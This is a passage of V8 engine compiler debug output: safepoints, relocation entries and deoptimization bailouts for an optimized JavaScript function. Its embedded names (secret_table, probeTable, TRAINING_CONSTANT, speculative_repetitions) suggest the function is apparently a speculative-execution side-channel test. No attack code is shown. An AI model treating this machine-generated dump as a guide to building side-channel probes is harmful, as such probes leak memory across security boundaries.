                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=18}

Safepoints (size = 224)
0x1425ddef63e6     206   dbc  00000000010001100000000000 (sp -> fp)      10
0x1425ddef6720     540   e2f  00000000010001000000000000 (sp -> fp)      33
0x1425ddef68e8     708   e75  00000001110001100000000000 (sp -> fp)      47
0x1425ddef6aab     8cb   e8e  00000001110001000000000000 (sp -> fp)      52
0x1425ddef6c25     a45   ea2  00001110010001000000000000 (sp -> fp)      56
0x1425ddef6c7e     a9e   ea7  00001110010001000000000000 (sp -> fp)      57
0x1425ddef6df1     c11   eac  00001110010001000000000000 (sp -> fp)      58
0x1425ddef6e43     c63   eb1  00001010010001000000000000 (sp -> fp)      59
0x1425ddef6e8a     caa   eb6  00000110010001000000000000 (sp -> fp)      60
0x1425ddef6ec7     ce7   ebb  00000011010001000000000000 (sp -> fp)      61
0x1425ddef6f01     d21   ec0  00000011110001000000000000 (sp -> fp)      62
0x1425ddef6f34     d54   ec5  00000001110001000000000000 (sp -> fp)      63

RelocInfo (size = 3543)
0x1425ddef61e0  comment  (-- <not inlined:293> --)
0x1425ddef61e0  comment  (-- Prologue: check for deoptimization --)
0x1425ddef61ea  code target (BUILTIN CompileLazyDeoptimizedCode)  (0x1425dde0ef20)
0x1425ddef61ee  comment  (-- B0 start (construct frame) --)
0x1425ddef61ff  code target (BUILTIN Abort)  (0x1425dde1d880)
0x1425ddef6204  comment  (-- OSR entrypoint --)
0x1425ddef6208  comment  (-- <not inlined:434> --)
0x1425ddef620c  comment  (-- <not inlined:436> --)
0x1425ddef621e  comment  (-- B1 start --)
0x1425ddef6222  comment  (-- <not inlined:462> --)
0x1425ddef622c  comment  (-- B2 start --)
0x1425ddef622c  comment  (-- <not inlined:460> --)
0x1425ddef6261  comment  (-- B3 start --)
0x1425ddef6261  comment  (-- B5 start --)
0x1425ddef6261  comment  (-- <not inlined:434> --)
0x1425ddef6287  comment  (-- B6 start --)
0x1425ddef6287  comment  (-- B7 start --)
0x1425ddef6287  comment  (-- <not inlined:416> --)
0x1425ddef6294  comment  (-- B9 start --)
0x1425ddef6294  comment  (-- B10 start --)
0x1425ddef6294  comment  (-- <not inlined:524> --)
0x1425ddef62a0  comment  (-- <not inlined:529> --)
0x1425ddef62a9  comment  (-- B11 start --)
0x1425ddef62a9  comment  (-- B13 start --)
0x1425ddef62a9  comment  (-- <not inlined:524> --)
0x1425ddef62ac  comment  (-- <not inlined:529> --)
0x1425ddef62cb  comment  (-- B14 start --)
0x1425ddef62d4  comment  (-- B15 start --)
0x1425ddef62e0  comment  (-- B16 start --)
0x1425ddef62e5  comment  (-- B17 start --)
0x1425ddef62e5  comment  (-- B22 start --)
0x1425ddef62f7  comment  (-- <not inlined:579> --)
0x1425ddef6313  comment  (-- B23 start --)
0x1425ddef6313  comment  (-- <not inlined:587> --)
0x1425ddef631d  comment  (-- B24 start --)
0x1425ddef6346  comment  (-- B25 start --)
0x1425ddef634a  comment  (-- B26 start --)
0x1425ddef634a  comment  (-- <not inlined:634> --)
0x1425ddef634e  comment  (-- <not inlined:589> --)
0x1425ddef6354  comment  (-- <not inlined:587> --)
0x1425ddef6357  comment  (-- <not inlined:650> --)
0x1425ddef636f  comment  (-- B27 start --)
0x1425ddef636f  comment  (-- <not inlined:663> --)
0x1425ddef638b  comment  (-- <not inlined:670> --)
0x1425ddef6395  comment  (-- B28 start --)
0x1425ddef6395  comment  (-- <not inlined:668> --)
0x1425ddef63c0  comment  (-- B29 start --)
0x1425ddef63c0  comment  (-- B31 start --)
0x1425ddef63c0  comment  (-- <not inlined:634> --)
0x1425ddef63d0  embedded object  (0x1881164127e9 <JSFunction Uint8Array (sfi = 0x2e97c214b01)>)
0x1425ddef63e2  code target (BUILTIN CreateTypedArray)  (0x1425dde4b960)
0x1425ddef63e6  comment  (-- <not inlined:765> --)
0x1425ddef63ee  comment  (-- <not inlined:802> --)
0x1425ddef63f8  comment  (-- B32 start --)
0x1425ddef63f8  comment  (-- <not inlined:800> --)
0x1425ddef6418  comment  (-- <not inlined:797> --)
0x1425ddef6428  embedded object  (0x065413904781 <Map(UINT8_ELEMENTS)>)
0x1425ddef6458  comment  (-- <not inlined:813> --)
0x1425ddef6464  comment  (-- B33 start --)
0x1425ddef6464  comment  (-- <not inlined:867> --)
0x1425ddef6472  comment  (-- B34 start --)
0x1425ddef6472  comment  (-- <not inlined:879> --)
0x1425ddef64a9  comment  (-- <not inlined:1128> --)
0x1425ddef64b7  comment  (-- B35 start --)
0x1425ddef64b7  comment  (-- <not inlined:1151> --)
0x1425ddef64ba  comment  (-- <not inlined:1167> --)
0x1425ddef64c3  comment  (-- <not inlined:1147> --)
0x1425ddef64d9  comment  (-- <not inlined:1179> --)
0x1425ddef64e3  comment  (-- <not inlined:1147> --)
0x1425ddef6508  comment  (-- <not inlined:1133> --)
0x1425ddef6510  comment  (-- B38 start --)
0x1425ddef6510  comment  (-- B39 start --)
0x1425ddef6510  comment  (-- <not inlined:1238> --)
0x1425ddef651d  comment  (-- B40 start --)
0x1425ddef651d  comment  (-- <not inlined:1318> --)
0x1425ddef6523  embedded object  (0x21fd4dfb5589 <JSFunction probeTable (sfi = 0x139723ed8571)>)
0x1425ddef6534  comment  (-- B41 start --)
0x1425ddef6534  comment  (-- B42 start --)
0x1425ddef6550  comment  (-- B43 start (loop up to 83) --)
0x1425ddef6550  comment  (-- <not inlined:434> --)
0x1425ddef6554  comment  (-- <not inlined:436> --)
0x1425ddef6562  comment  (-- B44 start (in loop 43) --)
0x1425ddef6566  comment  (-- <not inlined:462> --)
0x1425ddef6577  comment  (-- B45 start (in loop 43) --)
0x1425ddef6577  comment  (-- <not inlined:460> --)
0x1425ddef65ae  comment  (-- B46 start (in loop 43) --)
0x1425ddef65ae  comment  (-- B48 start (in loop 43) --)
0x1425ddef65ae  comment  (-- <not inlined:434> --)
0x1425ddef65be  comment  (-- B49 start (in loop 43) --)
0x1425ddef65be  comment  (-- <not inlined:416> --)
0x1425ddef65cb  comment  (-- B51 start (in loop 43) --)
0x1425ddef65cb  comment  (-- B52 start (in loop 43) --)
0x1425ddef65cb  comment  (-- <not inlined:524> --)
0x1425ddef65d7  comment  (-- <not inlined:529> --)
0x1425ddef65e0  comment  (-- B53 start (in loop 43) --)
0x1425ddef65e0  comment  (-- B55 start (in loop 43) --)
0x1425ddef65e0  comment  (-- <not inlined:524> --)
0x1425ddef65e3  comment  (-- <not inlined:529> --)
0x1425ddef6604  comment  (-- B56 start (in loop 43) --)
0x1425ddef660d  comment  (-- B57 start (in loop 43) --)
0x1425ddef661a  comment  (-- B58 start (in loop 43) --)
0x1425ddef661f  comment  (-- B59 start (in loop 43) --)
0x1425ddef661f  comment  (-- B64 start (in loop 43) --)
0x1425ddef6631  comment  (-- <not inlined:579> --)
0x1425ddef664d  comment  (-- B65 start (in loop 43) --)
0x1425ddef664d  comment  (-- <not inlined:587> --)
0x1425ddef6657  comment  (-- B66 start (in loop 43) --)
0x1425ddef6682  comment  (-- B67 start (in loop 43) --)
0x1425ddef6686  comment  (-- B68 start (in loop 43) --)
0x1425ddef6686  comment  (-- <not inlined:634> --)
0x1425ddef668a  comment  (-- <not inlined:589> --)
0x1425ddef6690  comment  (-- <not inlined:587> --)
0x1425ddef6693  comment  (-- <not inlined:650> --)
0x1425ddef66ab  comment  (-- B69 start (in loop 43) --)
0x1425ddef66ab  comment  (-- <not inlined:663> --)
0x1425ddef66c7  comment  (-- <not inlined:670> --)
0x1425ddef66d1  comment  (-- B70 start (in loop 43) --)
0x1425ddef66d1  comment  (-- <not inlined:668> --)
0x1425ddef66fa  comment  (-- B71 start (in loop 43) --)
0x1425ddef66fa  comment  (-- B73 start (in loop 43) --)
0x1425ddef66fa  comment  (-- <not inlined:634> --)
0x1425ddef6706  embedded object  (0x1881164127e9 <JSFunction Uint8Array (sfi = 0x2e97c214b01)>)
0x1425ddef671c  code target (BUILTIN CreateTypedArray)  (0x1425dde4b960)
0x1425ddef6720  comment  (-- <not inlined:765> --)
0x1425ddef6728  comment  (-- <not inlined:802> --)
0x1425ddef6732  comment  (-- B74 start (in loop 43) --)
0x1425ddef6732  comment  (-- <not inlined:800> --)
0x1425ddef6752  comment  (-- <not inlined:797> --)
0x1425ddef6758  embedded object  (0x065413904781 <Map(UINT8_ELEMENTS)>)
0x1425ddef6788  comment  (-- <not inlined:813> --)
0x1425ddef6794  comment  (-- B75 start (in loop 43) --)
0x1425ddef6794  comment  (-- <not inlined:867> --)
0x1425ddef67a2  comment  (-- B76 start (in loop 43) --)
0x1425ddef67a2  comment  (-- <not inlined:879> --)
0x1425ddef67da  comment  (-- <not inlined:1128> --)
0x1425ddef67e8  comment  (-- B77 start (in loop 43) --)
0x1425ddef67e8  comment  (-- <not inlined:1151> --)
0x1425ddef67eb  comment  (-- <not inlined:1167> --)
0x1425ddef67f4  comment  (-- <not inlined:1147> --)
0x1425ddef680a  comment  (-- <not inlined:1179> --)
0x1425ddef6814  comment  (-- <not inlined:1147> --)
0x1425ddef6839  comment  (-- <not inlined:1133> --)
0x1425ddef6841  comment  (-- B78 start (in loop 43) --)
0x1425ddef6841  comment  (-- B79 start (in loop 43) --)
0x1425ddef6841  comment  (-- <not inlined:1238> --)
0x1425ddef684e  comment  (-- B80 start (in loop 43) --)
0x1425ddef684e  comment  (-- <not inlined:1318> --)
0x1425ddef6854  embedded object  (0x21fd4dfb5589 <JSFunction probeTable (sfi = 0x139723ed8571)>)
0x1425ddef6865  comment  (-- B81 start (in loop 43) --)
0x1425ddef6865  comment  (-- B82 start (in loop 43) --)
0x1425ddef687b  comment  (-- B83 start --)
0x1425ddef687b  comment  (-- B84 start (deconstruct frame) --)
0x1425ddef687b  comment  (-- <not inlined:1404> --)
0x1425ddef6886  comment  (-- B107 start (no frame) --)
0x1425ddef6886  comment  (-- B4 start (deferred) --)
0x1425ddef6886  comment  (-- <not inlined:460> --)
0x1425ddef68c5  comment  (-- B8 start (deferred) --)
0x1425ddef68c5  comment  (-- <not inlined:416> --)
0x1425ddef68e4  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x1425dde4fb00)
0x1425ddef690e  comment  (-- B12 start (deferred) --)
0x1425ddef690e  comment  (-- <not inlined:529> --)
0x1425ddef6958  comment  (-- B18 start (deferred) --)
0x1425ddef6974  comment  (-- B19 start (deferred) --)
0x1425ddef6980  comment  (-- B20 start (deferred) --)
0x1425ddef6985  comment  (-- B21 start (deferred) --)
0x1425ddef69af  comment  (-- B30 start (deferred) --)
0x1425ddef69af  comment  (-- <not inlined:668> --)
0x1425ddef69fa  comment  (-- B36 start (deferred) --)
0x1425ddef6a1c  comment  (-- B37 start (deferred) --)
0x1425ddef6a4c  comment  (-- B47 start (deferred) (in loop 43) --)
0x1425ddef6a4c  comment  (-- <not inlined:460> --)
0x1425ddef6a7e  embedded object  (0x065413904781 <Map(UINT8_ELEMENTS)>)
0x1425ddef6a92  comment  (-- B50 start (deferred) (in loop 43) --)
0x1425ddef6a92  comment  (-- <not inlined:416> --)
0x1425ddef6aa7  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x1425dde4fb00)
0x1425ddef6ace  embedded object  (0x065413904781 <Map(UINT8_ELEMENTS)>)
0x1425ddef6adb  comment  (-- B54 start (deferred) (in loop 43) --)
0x1425ddef6adb  comment  (-- <not inlined:529> --)
0x1425ddef6b1b  embedded object  (0x065413904781 <Map(UINT8_ELEMENTS)>)
0x1425ddef6b28  comment  (-- B60 start (deferred) (in loop 43) --)
0x1425ddef6b3d  comment  (-- B61 start (deferred) (in loop 43) --)
0x1425ddef6b4a  comment  (-- B62 start (deferred) (in loop 43) --)
0x1425ddef6b4f  comment  (-- B63 start (deferred) (in loop 43) --)
0x1425ddef6b76  embedded object  (0x065413904781 <Map(UINT8_ELEMENTS)>)
0x1425ddef6b83  comment  (-- B72 start (deferred) (in loop 43) --)
0x1425ddef6b83  comment  (-- <not inlined:668> --)
0x1425ddef6bbc  embedded object  (0x065413904781 <Map(UINT8_ELEMENTS)>)
0x1425ddef6bd0  comment  (-- B85 start (deferred) --)
0x1425ddef6bf4  comment  (-- B86 start (deferred) --)
0x1425ddef6bfd  embedded object  (0x139723ed80a1 <String[4]: junk>)
0x1425ddef6c06  comment  (-- <not inlined:1128> --)
0x1425ddef6c21  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x1425dde4fb00)
0x1425ddef6c25  comment  (-- B87 start (deferred) --)
0x1425ddef6c57  comment  (-- B88 start (deferred) --)
0x1425ddef6c60  embedded object  (0x139723ed8171 <String[12]: secret_table>)
0x1425ddef6c69  comment  (-- <not inlined:867> --)
0x1425ddef6c7a  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x1425dde4fb00)
0x1425ddef6c7e  comment  (-- B89 start (deferred) --)
0x1425ddef6cb5  comment  (-- B90 start (deferred) --)
0x1425ddef6cf3  comment  (-- B91 start (deferred) --)
0x1425ddef6d2a  comment  (-- B92 start (deferred) --)
0x1425ddef6d53  comment  (-- B93 start (deferred) --)
0x1425ddef6d80  comment  (-- B94 start (deferred) --)
0x1425ddef6d80  comment  (-- <not inlined:436> --)
0x1425ddef6d9f  comment  (-- B95 start (deferred) --)
0x1425ddef6dca  comment  (-- B96 start (deferred) --)
0x1425ddef6dd3  embedded object  (0x139723ed8121 <String[9]: page_size>)
0x1425ddef6ddc  comment  (-- <not inlined:802> --)
0x1425ddef6ded  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x1425dde4fb00)
0x1425ddef6df1  comment  (-- B97 start (deferred) --)
0x1425ddef6e23  comment  (-- B98 start (deferred) --)
0x1425ddef6e25  embedded object  (0x139723ed8121 <String[9]: page_size>)
0x1425ddef6e2e  comment  (-- <not inlined:670> --)
0x1425ddef6e3f  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x1425dde4fb00)
0x1425ddef6e43  comment  (-- B99 start (deferred) --)
0x1425ddef6e6a  comment  (-- B100 start (deferred) --)
0x1425ddef6e6c  embedded object  (0x139723ed8149 <String[12]: probe_length>)
0x1425ddef6e75  comment  (-- <not inlined:650> --)
0x1425ddef6e86  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x1425dde4fb00)
0x1425ddef6e8a  comment  (-- B101 start (deferred) --)
0x1425ddef6ea7  comment  (-- B102 start (deferred) --)
0x1425ddef6ea9  embedded object  (0x188116402541 <String[7]: address>)
0x1425ddef6eb2  comment  (-- <not inlined:579> --)
0x1425ddef6ec3  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x1425dde4fb00)
0x1425ddef6ec7  comment  (-- B103 start (deferred) --)
0x1425ddef6ee1  comment  (-- B104 start (deferred) --)
0x1425ddef6ee3  embedded object  (0x139723ed80f1 <String[17]: TRAINING_CONSTANT>)
0x1425ddef6eec  comment  (-- <not inlined:462> --)
0x1425ddef6efd  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x1425dde4fb00)
0x1425ddef6f01  comment  (-- B105 start (deferred) --)
0x1425ddef6f14  comment  (-- B106 start (deferred) --)
0x1425ddef6f16  embedded object  (0x139723ed80c1 <String[23]: speculative_repetitions>)
0x1425ddef6f1f  comment  (-- <not inlined:436> --)
0x1425ddef6f30  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x1425dde4fb00)
0x1425ddef6f34  comment  (-- Out of line code --)
0x1425ddef6f3e  code target (BUILTIN DoubleToI)  (0x1425dde52fa0)
0x1425ddef6f59  code target (BUILTIN DoubleToI)  (0x1425dde52fa0)
0x1425ddef6f6a  deopt script offset  (460)
0x1425ddef6f6a  deopt inlining id  (-1)
0x1425ddef6f6a  deopt reason  (not a Smi)
0x1425ddef6f6a  deopt index
0x1425ddef6f6b  runtime entry  (eager deoptimization bailout 0)
0x1425ddef6f6f  deopt script offset  (460)
0x1425ddef6f6f  deopt inlining id  (-1)
0x1425ddef6f6f  deopt reason  (not a Smi)
0x1425ddef6f6f  deopt index
0x1425ddef6f70  runtime entry  (eager deoptimization bailout 1)
0x1425ddef6f74  deopt script offset  (460)
0x1425ddef6f74  deopt inlining id  (-1)
0x1425ddef6f74  deopt reason  (overflow)
0x1425ddef6f74  deopt index
0x1425ddef6f75  runtime entry  (eager deoptimization bailout 2)
0x1425ddef6f79  deopt script offset  (434)
0x1425ddef6f79  deopt inlining id  (-1)
0x1425ddef6f79  deopt reason  (not a Smi)
0x1425ddef6f79  deopt index
0x1425ddef6f7a  runtime entry  (eager deoptimization bailout 3)
0x1425ddef6f7e  deopt script offset  (524)
0x1425ddef6f7e  deopt inlining id  (-1)
0x1425ddef6f7e  deopt reason  (overflow)
0x1425ddef6f7e  deopt index
0x1425ddef6f7f  runtime entry  (eager deoptimization bailout 4)
0x1425ddef6f83  deopt script offset  (587)
0x1425ddef6f83  deopt inlining id  (-1)
0x1425ddef6f83  deopt reason  (not a heap number)
0x1425ddef6f83  deopt index
0x1425ddef6f84  runtime entry  (eager deoptimization bailout 5)
0x1425ddef6f88  deopt script offset  (663)
0x1425ddef6f88  deopt inlining id  (-1)
0x1425ddef6f88  deopt reason  (not a Smi)
0x1425ddef6f88  deopt index
0x1425ddef6f89  runtime entry  (eager deoptimization bailout 6)
0x1425ddef6f8d  deopt script offset  (663)
0x1425ddef6f8d  deopt inlining id  (-1)
0x1425ddef6f8d  deopt reason  (overflow)
0x1425ddef6f8d  deopt index
0x1425ddef6f8e  runtime entry  (eager deoptimization bailout 7)
0x1425ddef6f92  deopt script offset  (668)
0x1425ddef6f92  deopt inlining id  (-1)
0x1425ddef6f92  deopt reason  (not a Smi)
0x1425ddef6f92  deopt index
0x1425ddef6f93  runtime entry  (eager deoptimization bailout 8)
0x1425ddef6f97  deopt script offset  (668)
0x1425ddef6f97  deopt inlining id  (-1)
0x1425ddef6f97  deopt reason  (overflow)
0x1425ddef6f97  deopt index
0x1425ddef6f98  runtime entry  (eager deoptimization bailout 9)
0x1425ddef6f9c  deopt script offset  (634)
0x1425ddef6f9c  deopt inlining id  (-1)
0x1425ddef6f9c  deopt reason  ((unknown))
0x1425ddef6f9c  deopt index
0x1425ddef6f9d  runtime entry  (lazy deoptimization bailout 10)
0x1425ddef6fa1  deopt script offset  (800)
0x1425ddef6fa1  deopt inlining id  (-1)
0x1425ddef6fa1  deopt reason  (not a Smi)
0x1425ddef6fa1  deopt index
0x1425ddef6fa2  runtime entry  (eager deoptimization bailout 11)
0x1425ddef6fa6  deopt script offset  (800)
0x1425ddef6fa6  deopt inlining id  (-1)
0x1425ddef6fa6  deopt reason  (overflow)
0x1425ddef6fa6  deopt index
0x1425ddef6fa7  runtime entry  (eager deoptimization bailout 12)
0x1425ddef6fab  deopt script offset  (797)
0x1425ddef6fab  deopt inlining id  (-1)
0x1425ddef6fab  deopt reason  (Smi)
0x1425ddef6fab  deopt index
0x1425ddef6fac  runtime entry  (eager deoptimization bailout 13)
0x1425ddef6fb0  deopt script offset  (797)
0x1425ddef6fb0  deopt inlining id  (-1)
0x1425ddef6fb0  deopt reason  (wrong map)
0x1425ddef6fb0  deopt index
0x1425ddef6fb1  runtime entry  (eager deoptimization bailout 14)
0x1425ddef6fb5  deopt script offset  (797)
0x1425ddef6fb5  deopt inlining id  (-1)
0x1425ddef6fb5  deopt reason  (out of bounds)
0x1425ddef6fb5  deopt index
0x1425ddef6fb6  runtime entry  (eager deoptimization bailout 15)
0x1425ddef6fba  deopt script offset  (879)
0x1425ddef6fba  deopt inlining id  (-1)
0x1425ddef6fba  deopt reason  (Smi)
0x1425ddef6fba  deopt index
0x1425ddef6fbb  runtime entry  (eager deoptimization bailout 16)
0x1425ddef6fbf  deopt script offset  (879)
0x1425ddef6fbf  deopt inlining id  (-1)
0x1425ddef6fbf  deopt reason  (wrong map)
0x1425ddef6fbf  deopt index
0x1425ddef6fc0  runtime entry  (eager deoptimization bailout 17)
0x1425ddef6fc4  deopt script offset  (879)
0x1425ddef6fc4  deopt inlining id  (-1)
0x1425ddef6fc4  deopt reason  (out of bounds)
0x1425ddef6fc4  deopt index
0x1425ddef6fc5  runtime entry  (eager deoptimization bailout 18)
0x1425ddef6fc9  deopt script offset  (1167)
0x1425ddef6fc9  deopt inlining id  (-1)
0x1425ddef6fc9  deopt reason  (overflow)
0x1425ddef6fc9  deopt index
0x1425ddef6fca  runtime entry  (eager deoptimization bailout 19)
0x1425ddef6fce  deopt script offset  (1147)
0x1425ddef6fce  deopt inlining id  (-1)
0x1425ddef6fce  deopt reason  (wrong map)
0x1425ddef6fce  deopt index
0x1425ddef6fcf  runtime entry  (eager deoptimization bailout 20)
0x1425ddef6fd3  deopt script offset  (1147)
0x1425ddef6fd3  deopt inlining id  (-1)
0x1425ddef6fd3  deopt reason  (out of bounds)
0x1425ddef6fd3  deopt index
0x1425ddef6fd4  runtime entry  (eager deoptimization bailout 21)
0x1425ddef6fd8  deopt script offset  (1147)
0x1425ddef6fd8  deopt inlining id  (-1)
0x1425ddef6fd8  deopt reason  (not a Smi)
0x1425ddef6fd8  deopt index
0x1425ddef6fd9  runtime entry  (eager deoptimization bailout 22)
0x1425ddef6fdd  deopt script offset  (1318)
0x1425ddef6fdd  deopt inlining id  (-1)
0x1425ddef6fdd  deopt reason  (wrong call target)
0x1425ddef6fdd  deopt index
0x1425ddef6fde  runtime entry  (eager deoptimization bailout 23)
0x1425ddef6fe2  deopt script offset  (460)
0x1425ddef6fe2  deopt inlining id  (-1)
0x1425ddef6fe2  deopt reason  (not a Smi)
0x1425ddef6fe2  deopt index
0x1425ddef6fe3  runtime entry  (eager deoptimization bailout 24)
0x1425ddef6fe7  deopt script offset  (460)
0x1425ddef6fe7  deopt inlining id  (-1)
0x1425ddef6fe7  deopt reason  (not a Smi)
0x1425ddef6fe7  deopt index
0x1425ddef6fe8  runtime entry  (eager deoptimization bailout 25)
0x1425ddef6fec  deopt script offset  (460)
0x1425ddef6fec  deopt inlining id  (-1)
0x1425ddef6fec  deopt reason  (overflow)
0x1425ddef6fec  deopt index
0x1425ddef6fed  runtime entry  (eager deoptimization bailout 26)
0x1425ddef6ff1  deopt script offset  (524)
0x1425ddef6ff1  deopt inlining id  (-1)
0x1425ddef6ff1  deopt reason  (overflow)
0x1425ddef6ff1  deopt index
0x1425ddef6ff2  runtime entry  (eager deoptimization bailout 27)
0x1425ddef6ff6  deopt script offset  (587)
0x1425ddef6ff6  deopt inlining id  (-1)
0x1425ddef6ff6  deopt reason  (not a heap number)
0x1425ddef6ff6  deopt index
0x1425ddef6ff7  runtime entry  (eager deoptimization bailout 28)
0x1425ddef6ffb  deopt script offset  (663)
0x1425ddef6ffb  deopt inlining id  (-1)
0x1425ddef6ffb  deopt reason  (not a Smi)
0x1425ddef6ffb  deopt index
0x1425ddef6ffc  runtime entry  (eager deoptimization bailout 29)
0x1425ddef7000  deopt script offset  (663)
0x1425ddef7000  deopt inlining id  (-1)
0x1425ddef7000  deopt reason  (overflow)
0x1425ddef7000  deopt index
0x1425ddef7001  runtime entry  (eager deoptimization bailout 30)
0x1425ddef7005  deopt script offset  (668)
0x1425ddef7005  deopt inlining id  (-1)
0x1425ddef7005  deopt reason  (not a Smi)
0x1425ddef7005  deopt index
0x1425ddef7006  runtime entry  (eager deoptimization bailout 31)
0x1425ddef700a  deopt script offset  (668)
0x1425ddef700a  deopt inlining id  (-1)
0x1425ddef700a  deopt reason  (overflow)
0x1425ddef700a  deopt index
0x1425ddef700b  runtime entry  (eager deoptimization bailout 32)
0x1425ddef700f  deopt script offset  (634)
0x1425ddef700f  deopt inlining id  (-1)
0x1425ddef700f  deopt reason  ((unknown))
0x1425ddef700f  deopt index
0x1425ddef7010  runtime entry  (lazy deoptimization bailout 33)
0x1425ddef7014  deopt script offset  (800)
0x1425ddef7014  deopt inlining id  (-1)
0x1425ddef7014  deopt reason  (not a Smi)
0x1425ddef7014  deopt index
0x1425ddef7015  runtime entry  (eager deoptimization bailout 34)
0x1425ddef7019  deopt script offset  (800)
0x1425ddef7019  deopt inlining id  (-1)
0x1425ddef7019  deopt reason  (overflow)
0x1425ddef7019  deopt index
0x1425ddef701a  runtime entry  (eager deoptimization bailout 35)
0x1425ddef701e  deopt script offset  (797)
0x1425ddef701e  deopt inlining id  (-1)
0x1425ddef701e  deopt reason  (wrong map)
0x1425ddef701e  deopt index
0x1425ddef701f  runtime entry  (eager deoptimization bailout 36)
0x1425ddef7023  deopt script offset  (797)
0x1425ddef7023  deopt inlining id  (-1)
0x1425ddef7023  deopt reason  (out of bounds)
0x1425ddef7023  deopt index
0x1425ddef7024  runtime entry  (eager deoptimization bailout 37)
0x1425ddef7028  deopt script offset  (879)
0x1425ddef7028  deopt inlining id  (-1)
0x1425ddef7028  deopt reason  (Smi)
0x1425ddef7028  deopt index
0x1425ddef7029  runtime entry  (eager deoptimization bailout 38)
0x1425ddef702d  deopt script offset  (879)
0x1425ddef702d  deopt inlining id  (-1)
0x1425ddef702d  deopt reason  (wrong map)
0x1425ddef702d  deopt index
0x1425ddef702e  runtime entry  (eager deoptimization bailout 39)
0x1425ddef7032  deopt script offset  (879)
0x1425ddef7032  deopt inlining id  (-1)
0x1425ddef7032  deopt reason  (out of bounds)
0x1425ddef7032  deopt index
0x1425ddef7033  runtime entry  (eager deoptimization bailout 40)
0x1425ddef7037  deopt script offset  (1167)
0x1425ddef7037  deopt inlining id  (-1)
0x1425ddef7037  deopt reason  (overflow)
0x1425ddef7037  deopt index
0x1425ddef7038  runtime entry  (eager deoptimization bailout 41)
0x1425ddef703c  deopt script offset  (1147)
0x1425ddef703c  deopt inlining id  (-1)
0x1425ddef703c  deopt reason  (wrong map)
0x1425ddef703c  deopt index
0x1425ddef703d  runtime entry  (eager deoptimization bailout 42)
0x1425ddef7041  deopt script offset  (1147)
0x1425ddef7041  deopt inlining id  (-1)
0x1425ddef7041  deopt reason  (out of bounds)
0x1425ddef7041  deopt index
0x1425ddef7042  runtime entry  (eager deoptimization bailout 43)
0x1425ddef7046  deopt script offset  (1147)
0x1425ddef7046  deopt inlining id  (-1)
0x1425ddef7046  deopt reason  (not a Smi)
0x1425ddef7046  deopt index
0x1425ddef7047  runtime entry  (eager deoptimization bailout 44)
0x1425ddef704b  deopt script offset  (1318)
0x1425ddef704b  deopt inlining id  (-1)
0x1425ddef704b  deopt reason  (wrong call target)
0x1425ddef704b  deopt index
0x1425ddef704c  runtime entry  (eager deoptimization bailout 45)
0x1425ddef7050  deopt script offset  (460)
0x1425ddef7050  deopt inlining id  (-1)
0x1425ddef7050  deopt reason  (minus zero)
0x1425ddef7050  deopt index
0x1425ddef7051  runtime entry  (eager deoptimization bailout 46)
0x1425ddef7055  deopt script offset  (416)
0x1425ddef7055  deopt inlining id  (-1)
0x1425ddef7055  deopt reason  ((unknown))
0x1425ddef7055  deopt index
0x1425ddef7056  runtime entry  (lazy deoptimization bailout 47)
0x1425ddef705a  deopt script offset  (529)
0x1425ddef705a  deopt inlining id  (-1)
0x1425ddef705a  deopt reason  (division by zero)
0x1425ddef705a  deopt index
0x1425ddef705b  runtime entry  (eager deoptimization bailout 48)
0x1425ddef705f  deopt script offset  (529)
0x1425ddef705f  deopt inlining id  (-1)
0x1425ddef705f  deopt reason  (minus zero)
0x1425ddef705f  deopt index
0x1425ddef7060  runtime entry  (eager deoptimization bailout 49)
0x1425ddef7064  deopt script offset  (668)
0x1425ddef7064  deopt inlining id  (-1)
0x1425ddef7064  deopt reason  (minus zero)
0x1425ddef7064  deopt index
0x1425ddef7065  runtime entry  (eager deoptimization bailout 50)
0x1425ddef7069  deopt script offset  (460)
0x1425ddef7069  deopt inlining id  (-1)
0x1425ddef7069  deopt reason  (minus zero)
0x1425ddef7069  deopt index
0x1425ddef706a  runtime entry  (eager deoptimization bailout 51)
0x1425ddef706e  deopt script offset  (416)
0x1425ddef706e  deopt inlining id  (-1)
0x1425ddef706e  deopt reason  ((unknown))
0x1425ddef706e  deopt index
0x1425ddef706f  runtime entry  (lazy deoptimization bailout 52)
0x1425ddef7073  deopt script offset  (529)
0x1425ddef7073  deopt inlining id  (-1)
0x1425ddef7073  deopt reason  (division by zero)
0x1425ddef7073  deopt index
0x1425ddef7074  runtime entry  (eager deoptimization bailout 53)
0x1425ddef7078  deopt script offset  (529)
0x1425ddef7078  deopt inlining id  (-1)
0x1425ddef7078  deopt reason  (minus zero)
0x1425ddef7078  deopt index
0x1425ddef7079  runtime entry  (eager deoptimization bailout 54)
0x1425ddef707d  deopt script offset  (668)
0x1425ddef707d  deopt inlining id  (-1)
0x1425ddef707d  deopt reason  (minus zero)
0x1425ddef707d  deopt index
0x1425ddef707e  runtime entry  (eager deoptimization bailout 55)
0x1425ddef7082  deopt script offset  (1128)
0x1425ddef7082  deopt inlining id  (-1)
0x1425ddef7082  deopt reason  ((unknown))
0x1425ddef7082  deopt index
0x1425ddef7083  runtime entry  (lazy deoptimization bailout 56)
0x1425ddef7087  deopt script offset  (867)
0x1425ddef7087  deopt inlining id  (-1)
0x1425ddef7087  deopt reason  ((unknown))
0x1425ddef7087  deopt index
0x1425ddef7088  runtime entry  (lazy deoptimization bailout 57)
0x1425ddef708c  deopt script offset  (802)
0x1425ddef708c  deopt inlining id  (-1)
0x1425ddef708c  deopt reason  ((unknown))
0x1425ddef708c  deopt index
